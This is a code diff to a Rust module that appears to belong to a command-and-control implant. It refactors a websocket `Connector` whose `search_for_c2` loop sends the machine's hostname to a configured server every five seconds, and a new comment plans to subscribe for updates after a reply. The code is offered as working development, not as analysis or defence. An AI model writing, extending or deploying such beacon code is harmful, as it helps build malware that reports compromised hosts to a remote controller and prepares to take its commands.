@@ -5,22 +5,17 @@ use std::{thread, time::Duration};
 
 use futures_util::SinkExt;
 use gethostname::gethostname;
-use tokio_tungstenite::{
-    connect_async,
-    tungstenite::Message,
-};
-pub struct Connector<'a> {
+use tokio_tungstenite::{connect_async, tungstenite::Message};
+pub struct Connector {
     //Server address sends data to main server
-    socket_addr_server: &'a str,
+    address_server: String,
 }
-impl<'a> Connector<'a> {
-    pub fn new(address_server: &'a str) -> Self {
-        Connector {
-            socket_addr_server: address_server,
-        }
+impl Connector {
+    pub fn new(address_server: String) -> Self {
+        Connector { address_server }
     }
-    pub async fn send_data(&self, data: &str) {
-        match connect_async(self.socket_addr_server).await {
+    pub async fn send_data(&self, data: String) {
+        match connect_async(&self.address_server).await {
             Ok((mut ws_stream, response)) => {
                 println!("Connected to the server");
                 match ws_stream.send(Message::Text(data.into())).await {
@@ -42,8 +37,9 @@ impl<'a> Connector<'a> {
 
     pub async fn search_for_c2(&self) {
         loop {
-            self.send_data(&format!("ping|{}", gethostname().into_string().unwrap()))
+            self.send_data(format!("ping|{}", gethostname().into_string().unwrap()))
                 .await;
+            //when recieved a pong subscribe for updates
             thread::sleep(Duration::from_secs(5));
         }
     }
